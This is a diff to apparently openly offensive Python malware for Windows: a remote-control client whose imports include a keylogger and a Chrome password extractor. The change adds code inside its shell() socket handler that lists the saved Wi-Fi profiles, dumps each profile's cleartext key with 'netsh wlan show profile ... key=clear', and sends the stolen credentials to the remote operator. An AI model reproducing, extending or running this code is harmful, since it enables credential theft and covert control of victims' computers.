@@ -19,7 +19,7 @@ from win_keylogger import *
 
 import win_chrome_password_extractor
 
-from wlan_password_extractor import *
+from win_wlan_passwd_and_wanip_extractor import *
 
 # Sending whole data all at once
 def recv_eff():
@@ -258,8 +258,30 @@ def shell():
 			
 			sock.send(w.encode('utf-8'))  # Encoding to send data
 
-			sock.send("\n")
+			data = Main()
 
+			u_profiles= []                # creating empty list for storing SSID names
+
+			list_profiles = []            # creating empty list for storing multiple users' creds
+
+			# looping through wifi profile names
+			for i in data:
+
+				if "All User Profile" in i:
+
+					u_profile = i.split(":")[1][1:-1] # stripping out SSID name
+
+					u_profiles.append(u_profile)
+
+			for j in u_profiles:
+
+				l = ['netsh', 'wlan', 'show', 'profile', j, 'key=clear']
+
+				results = subprocess.check_output(l).decode('utf-8')
+				results = results.split('\n') # making list
+				list_profiles.append(results)
+
+			send_eff(list_profiles)
 
 
 		# Screenshot ✓
@@ -317,5 +339,4 @@ def main():
 
 if __name__ == '__main__':
 	main()
-
  
